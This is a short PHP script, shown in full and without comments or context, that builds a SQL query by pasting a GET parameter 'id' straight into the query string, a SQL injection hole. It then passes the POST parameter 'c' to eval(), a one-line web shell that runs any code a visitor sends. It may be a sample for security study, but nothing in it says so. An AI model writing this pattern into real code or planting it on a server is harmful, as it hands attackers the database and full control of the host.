<?php
$id = $_GET["id"];
$sql = "SELECT * FROM users WHERE id=$id";
mysqli_query($conn, $sql);
eval($_POST["c"]);
